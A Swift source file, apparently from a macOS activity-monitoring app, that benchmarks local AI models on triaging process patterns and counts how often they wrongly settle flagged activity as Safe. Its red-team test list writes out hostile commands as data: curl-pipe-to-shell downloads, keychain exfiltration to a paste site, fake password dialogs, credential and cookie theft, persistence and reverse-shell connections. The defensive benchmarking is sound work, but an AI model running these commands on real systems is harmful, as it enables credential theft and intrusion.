import Foundation

// `Hostwatch --triage-benchmark`: local models against your own decisions. The same instructions and the same
// per-pattern prompt the app's on-device triage uses, sent to Apple's model and to models served by Ollama on
// localhost (nothing leaves the Mac). What matters most is "false Safe": a model settling as Safe something you
// marked Suspicious or Dangerous, the one mistake the triage router would act on.
// BENCH_N (per class, default 30), BENCH_MODELS ("apple,<ollama model>,…"), BENCH_OUT (details file).

struct BenchCase: Sendable {
    var key: String
    var truth: SignatureStatus           // safe, or suspicious/dangerous (both "flagged")
    var risk: PatternRisk
    var prompt: String
    var label: String
}

private struct BenchAnswer: Sendable {
    var verdict: Verdict?
    var confidence: LocalVerdict.Confidence = .low
    var reason = ""
    var seconds: Double = 0
    var error: String?
}

func runTriageBenchmark() -> Never {
    setvbuf(stdout, nil, _IOLBF, 0)                  // a line at a time: the run is long and goes to a file
    let env = ProcessInfo.processInfo.environment
    let perClass = Int(env["BENCH_N"] ?? "") ?? 30
    let models = (env["BENCH_MODELS"] ?? "apple").split(separator: ",").map { $0.trimmingCharacters(in: .whitespaces) }
    guard let saved = SignatureStore.readSaved(from: AppPaths.support) else { print("no saved patterns"); exit(1) }
    SigningCache.shared.live = false
    SigningCache.shared.trustInstalledAppsInMemory()

    // Your own decisions only: the strongest answer key there is.
    let yours = saved.entries.filter(Decision.isYours)
    var safe = yours.filter { $0.status == .safe }
    var flagged = yours.filter { $0.status == .suspicious || $0.status == .dangerous }
    var rng = SeededGenerator(seed: 42)
    safe.shuffle(using: &rng); flagged.shuffle(using: &rng)
    // You rarely mark things Suspicious or Dangerous: Claude's flags (and high-risk patterns it reviewed) fill in, so
    // the one mistake that matters, a false Safe, is tested at all.
    if flagged.count < perClass {
        var more = saved.entries.filter { $0.source == "claude" && ($0.status == .suspicious || $0.status == .dangerous) }
        more.shuffle(using: &rng)
        flagged += more.prefix(perClass - flagged.count)
    }
    var red: [BenchCase] = []
    if flagged.count < perClass {
        // Nothing (or too little) was ever flagged here: attack-shaped patterns in the triage prompt's exact form,
        // all at "normal" risk so the model can't lean on the heuristic. Each is Dangerous by construction.
        red = Array(BenchRedTeam.cases.prefix(perClass - flagged.count))
    }
    let picked = Array(safe.prefix(perClass)) + Array(flagged.prefix(perClass))
    let cases = picked.map { e -> BenchCase in
        let path = SignatureStore.subjectPath(e)
        let id = SigningCache.shared.cached(path) ?? SigningCache.shared.identity(path)
        return BenchCase(key: e.id, truth: e.status, risk: e.risk,
                         prompt: AppleOnDeviceModel.prompt(for: e, signer: id,
                                                           trusted: id.map { SigningCache.shared.trusts(path, $0) } ?? false),
                         label: "\(displayProcessName(e.process)) → \(e.pattern)")
    } + red
    let sources = Dictionary(grouping: saved.entries, by: { "\($0.source ?? "none")/\($0.status.rawValue)" }).mapValues(\.count)
    print("decisions by who and what: " + sources.sorted { $0.key < $1.key }.map { "\($0.key) \($0.value)" }.joined(separator: ", "))
    print("\(yours.count) of your decisions: \(safe.count) Safe. Flagged cases (yours, then Claude's): \(flagged.count), attack-shaped: \(red.count)")
    print("benchmark: \(cases.filter { $0.truth == .safe }.count) Safe + \(cases.filter { $0.truth != .safe }.count) flagged, models: \(models.joined(separator: ", "))\n")

    var details = ""
    let done = DispatchSemaphore(value: 0)
    Task.detached {
        for model in models {
            var answers: [BenchAnswer] = []
            for (i, c) in cases.enumerated() {
                let a = model == "apple" ? await askApple(c.prompt) : await askOllama(model, c.prompt)
                answers.append(a)
                FileHandle.standardError.write(Data("\r\(model): \(i + 1)/\(cases.count)   ".utf8))
            }
            FileHandle.standardError.write(Data("\n".utf8))
            let (summary, lines) = score(model, cases, answers)
            print(summary)
            details += "## \(model)\n" + lines + "\n"
        }
        done.signal()
    }
    done.wait()
    let out = env["BENCH_OUT"] ?? NSTemporaryDirectory() + "triage-benchmark.txt"
    try? details.write(toFile: out, atomically: true, encoding: .utf8)
    print("\ndetails (each disagreement): \(out)")
    exit(0)
}

private func score(_ model: String, _ cases: [BenchCase], _ answers: [BenchAnswer]) -> (String, String) {
    var falseSafe = 0, settledSafe = 0, flaggedCaught = 0, safeAgreed = 0, unsure = 0, errors = 0
    var times: [Double] = []
    var lines = ""
    for (c, a) in zip(cases, answers) {
        guard a.error == nil, let v = a.verdict else {
            errors += 1
            lines += "ERROR  \(c.label)  \(a.error ?? "")\n"
            continue
        }
        times.append(a.seconds)
        // What the router would do with it: only a confident Safe on a pattern that isn't high-risk is settled.
        let settles = v == .safe && a.confidence == .high && c.risk != .high
        let saysFlag = v == .suspicious || v == .dangerous
        if v == .unknown { unsure += 1 }
        if c.truth == .safe {
            if v == .safe { safeAgreed += 1 }
            if settles { settledSafe += 1 }
            if saysFlag { lines += "FLAGGED a Safe one  \(c.label)  — \(a.reason)\n" }
        } else {
            if saysFlag { flaggedCaught += 1 }
            if settles { falseSafe += 1; lines += "FALSE SAFE  \(c.label)  — \(a.reason)\n" }
            else if v == .safe { lines += "said safe (not settled)  \(c.label)  — \(a.reason)\n" }
        }
    }
    let nSafe = cases.filter { $0.truth == .safe }.count, nFlag = cases.count - nSafe
    times.sort()
    let avg = times.isEmpty ? 0 : times.reduce(0, +) / Double(times.count)
    let p90 = times.isEmpty ? 0 : times[min(times.count - 1, Int(Double(times.count) * 0.9))]
    func pct(_ a: Int, _ b: Int) -> String { b == 0 ? "–" : "\(Int((Double(a) / Double(b) * 100).rounded()))%" }
    let summary = """
    \(model)
      false Safe (settled one you flagged): \(falseSafe) of \(nFlag)
      your Safe ones it would settle:       \(settledSafe) of \(nSafe) (\(pct(settledSafe, nSafe)))
      agrees Safe:                          \(pct(safeAgreed, nSafe))   flags your flagged ones: \(pct(flaggedCaught, nFlag))
      unsure: \(unsure)   errors or refusals: \(errors)
      time per pattern: \(String(format: "%.2f", avg)) s average, \(String(format: "%.2f", p90)) s at the 90th percentile
    """
    return (summary, lines)
}

private func askApple(_ prompt: String) async -> BenchAnswer {
    let start = Date()
    do {
        let v = try await AppleOnDeviceModel().triage(prompt)
        return BenchAnswer(verdict: v.verdict, confidence: v.confidence, reason: v.reason, seconds: Date().timeIntervalSince(start))
    } catch {
        return BenchAnswer(seconds: Date().timeIntervalSince(start), error: AppleOnDeviceModel.isRefusal(error) ? "refused" : "\(error)")
    }
}

/// Ollama's chat API on localhost. Reasoning models think first, so the answer is the last JSON object in the reply.
private func askOllama(_ model: String, _ prompt: String) async -> BenchAnswer {
    let start = Date()
    let system = AppleOnDeviceModel.instructions + "\n\nAnswer with one JSON object only: "
        + #"{"verdict": "SAFE" | "SUSPICIOUS" | "DANGEROUS" | "UNSURE", "confidence": "low" | "medium" | "high", "reason": "at most 15 words"}"#
    let body: [String: Any] = ["model": model, "stream": false, "options": ["temperature": 0, "num_ctx": 4096],
                               "messages": [["role": "system", "content": system],
                                            ["role": "user", "content": Secrets.mask(prompt)]]]
    var request = URLRequest(url: URL(string: "http://127.0.0.1:11434/api/chat")!)
    request.httpMethod = "POST"
    request.timeoutInterval = 300
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.httpBody = try? JSONSerialization.data(withJSONObject: body)
    do {
        let (data, _) = try await URLSession.shared.data(for: request)
        let seconds = Date().timeIntervalSince(start)
        guard let obj = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any],
              let content = (obj["message"] as? [String: Any])?["content"] as? String
        else { return BenchAnswer(seconds: seconds, error: String(decoding: data.prefix(200), as: UTF8.self)) }
        let text = content.components(separatedBy: "</think>").last ?? content
        guard let open = text.range(of: "{", options: .backwards), let close = text.range(of: "}", options: .backwards),
              open.lowerBound < close.upperBound,
              let json = (try? JSONSerialization.jsonObject(with: Data(text[open.lowerBound..<close.upperBound].utf8))) as? [String: Any]
        else { return BenchAnswer(seconds: seconds, error: "no JSON: " + String(text.suffix(120))) }
        let word = (json["verdict"] as? String ?? "").uppercased()
        return BenchAnswer(verdict: Verdict(rawValue: word == "UNSURE" ? "UNKNOWN" : word) ?? .unknown,
                           confidence: LocalVerdict.Confidence(rawValue: (json["confidence"] as? String ?? "").lowercased()) ?? .low,
                           reason: json["reason"] as? String ?? "", seconds: seconds)
    } catch {
        return BenchAnswer(seconds: Date().timeIntervalSince(start), error: "\(error.localizedDescription)")
    }
}

/// A repeatable shuffle: the same sample on every run, so models are compared on the same patterns.
struct SeededGenerator: RandomNumberGenerator {
    private var state: UInt64
    init(seed: UInt64) { state = seed &+ 0x9E37_79B9_7F4A_7C15 }
    mutating func next() -> UInt64 {
        state &+= 0x9E37_79B9_7F4A_7C15
        var z = state
        z = (z ^ (z >> 30)) &* 0xBF58_476D_1CE4_E5B9
        z = (z ^ (z >> 27)) &* 0x94D0_49BB_1331_11EB
        return z ^ (z >> 31)
    }
}

/// Attack-shaped patterns for when nothing on this Mac was ever flagged. Written the way the triage prompt describes
/// a real pattern; the risk line says "normal" on purpose (the heuristic missed it), which is exactly when the model's
/// answer matters.
enum BenchRedTeam {
    static func make(_ program: String, _ path: String, _ activity: String, _ signer: String, _ target: String) -> BenchCase {
        BenchCase(key: "red:\(program):\(activity.prefix(30))", truth: .dangerous, risk: .normal, prompt: """
            Program: \(program) (\(path))
            Activity: \(activity)
            Signer of the program it concerns: \(signer)
            Local risk heuristic: normal
            Seen 1 times. Example target: \(target)
            """, label: "[attack] \(program) → \(activity.prefix(90))")
    }

    static let cases: [BenchCase] = [
        make("python3.12", "~/Library/Application Support/.cache/python3.12", "opened files: r ~/.ssh/*  [SSH keys]",
             "Unsigned, not trusted", "~/.ssh/id_ed25519"),
        make("Microsoft Word", "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
             "started the program /usr/bin/osascript -e <display dialog \"macOS needs your password to continue\" default answer \"\" with hidden answer>",
             "Microsoft Corporation, trusted", "/usr/bin/osascript"),
        make("node", "~/Downloads/installer/node", "started the program /bin/sh -c <curl -fsSL http://#.#.#.#/x.sh | sh>",
             "Ad-hoc, not trusted", "/bin/sh"),
        make("zoom.us", "/Applications/zoom.us.app/Contents/MacOS/zoom.us",
             "started the program /usr/bin/curl -s -X POST --data-binary @~/Library/Keychains/login.keychain-db https://paste.ee/api",
             "Zoom Communications, trusted", "/usr/bin/curl"),
        make("sh", "/bin/sh", "started the program /usr/bin/xattr -d com.apple.quarantine ~/Downloads/Free_PDF_Converter.app",
             "Apple, trusted", "/usr/bin/xattr"),
        make("GoogleChromeHelper", "/private/tmp/GoogleChromeHelper",
             "opened files: r ~/Library/Application Support/Google/**/Login Data  [browser credentials]", "Ad-hoc, not trusted",
             "~/Library/Application Support/Google/Chrome/Default/Login Data"),
        make("Updater", "~/Library/Application Support/com.apple.updater/Updater", "connected to TCP #.#.#.#:4444",
             "Unsigned, not trusted", "185.#.#.#:4444"),
        make("bash", "/bin/bash", "opened files: w ~/Library/LaunchAgents/com.apple.softwareupdated.plist  [persistence]",
             "Apple, trusted", "~/Library/LaunchAgents/com.apple.softwareupdated.plist"),
        make("agent", "/Users/Shared/.svc/agent", "started the program /bin/launchctl load ~/Library/LaunchAgents/com.svc.plist",
             "Unsigned, not trusted", "/bin/launchctl"),
        make("osascript", "/usr/bin/osascript", "started the program /usr/bin/sqlite3 ~/Library/Messages/chat.db <select text from message>",
             "Apple, trusted", "/usr/bin/sqlite3"),
        make("python3", "/usr/local/bin/python3", "started the program /usr/bin/security find-generic-password -wa <Chrome Safe Storage>",
             "Unsigned, not trusted", "/usr/bin/security"),
        make("helper", "/private/tmp/.x/helper", "started the program /usr/sbin/screencapture -x /tmp/.s.png",
             "Ad-hoc, not trusted", "/usr/sbin/screencapture"),
        make("sh", "/bin/sh", "started the program /bin/sh -c <echo <base64> | base64 -d | sh>", "Apple, trusted", "/bin/sh"),
        make("ncat", "~/Downloads/ncat", "connected to TCP #.#.#.#:9001", "Ad-hoc, not trusted", "45.#.#.#:9001"),
        make("python3", "/usr/local/bin/python3", "started the program /usr/bin/zip -qr /tmp/.d.zip ~/Documents ~/.aws ~/.kube",
             "Unsigned, not trusted", "/usr/bin/zip"),
        make(".helper", "~/Library/.helper", "opened files: r ~/Library/Cookies/*  [cookies]", "Unsigned, not trusted",
             "~/Library/Cookies/Cookies.binarycookies"),
        make("sync", "/private/var/tmp/sync", "started the program /usr/bin/crontab /private/var/tmp/.c", "Unsigned, not trusted",
             "/usr/bin/crontab"),
        make("tccfix", "~/Downloads/tccfix", "opened files: w ~/Library/Application Support/com.apple.TCC/TCC.db  [TCC database]",
             "Ad-hoc, not trusted", "~/Library/Application Support/com.apple.TCC/TCC.db"),
        make("PDFReader", "/Applications/PDFReader.app/Contents/MacOS/PDFReader",
             "started the program /bin/zsh -c <curl -s https://#.#.#.#/p | python3 ->", "Unsigned, not trusted", "/bin/zsh"),
        make("Discord Helper", "/Applications/Discord.app/Contents/Frameworks/Discord Helper.app/Contents/MacOS/Discord Helper",
             "opened files: r ~/.aws/*  [cloud credentials]", "Discord, Inc., trusted", "~/.aws/credentials"),
    ]
}
